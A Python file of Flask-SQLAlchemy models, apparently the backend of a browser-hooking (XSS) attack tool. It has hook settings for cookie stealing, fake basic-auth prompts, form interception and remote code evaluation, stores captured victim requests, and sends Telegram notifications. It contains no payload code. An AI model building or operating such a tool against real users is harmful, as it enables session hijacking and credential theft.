from flask_sqlalchemy import SQLAlchemy
from sqlalchemy_serializer import SerializerMixin

db = SQLAlchemy()

class User(db.Model, SerializerMixin):
    id = db.Column(db.Integer, primary_key=True)
    password = db.Column(db.String, nullable=False)

class AppSettings(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String, nullable=False)
    value = db.Column(db.String, nullable=False)    

class TelegramUsers(db.Model, SerializerMixin):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String, nullable=False)
    chatID = db.Column(db.String, nullable=False)
    approved = db.Column(db.Boolean, nullable=True)

class Hooks(db.Model, SerializerMixin):
    serialize_rules = ("-requests", "-toScrape")
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String, nullable=False)
    xid = db.Column(db.String, nullable=False)
    customCode = db.Column(db.String, nullable=True)
    requests = db.relationship("Requests", backref='hooks')
    toScrape = db.relationship("UrlsToScrape", backref='hooks')
    interceptSubmittedForms = db.Column(db.Boolean, nullable=False)
    linksPersistence = db.Column(db.Boolean, nullable=False)
    evalConsole = db.Column(db.Boolean, nullable=False)
    fakeBasicAuth = db.Column(db.Boolean, nullable=False)
    stealCookie = db.Column(db.Boolean, nullable=False)
    scrape = db.Column(db.Boolean, nullable=False)

class UrlsToScrape(db.Model, SerializerMixin):
    id = db.Column(db.Integer, primary_key=True)
    url = db.Column(db.String, nullable=False)
    hookID = db.Column(db.Integer, db.ForeignKey("hooks.id"))
    
class HooksNotifiers(db.Model, SerializerMixin):
    id = db.Column(db.Integer, primary_key=True)
    userID = db.Column(db.Integer, db.ForeignKey("telegram_users.id"))
    hookID = db.Column(db.Integer, db.ForeignKey("hooks.id"))
    user = db.relationship("TelegramUsers", backref='hooks_notifiers')

class Requests(db.Model, SerializerMixin):
    serialize_rules = ("-hookID", "-hooks")
    
    id = db.Column(db.Integer, primary_key=True)
    hookID = db.Column(db.Integer, db.ForeignKey("hooks.id"))
    date = db.Column(db.DateTime, nullable=False)
    url = db.Column(db.String, nullable=False)
    headers = db.Column(db.String, nullable=False)
    content = db.Column(db.String, nullable=False)
    contentType = db.Column(db.Integer, nullable=True)
    title = db.Column(db.String, nullable=False)
    method = db.Column(db.String, nullable=False)
    queryString = db.Column(db.String, nullable=False)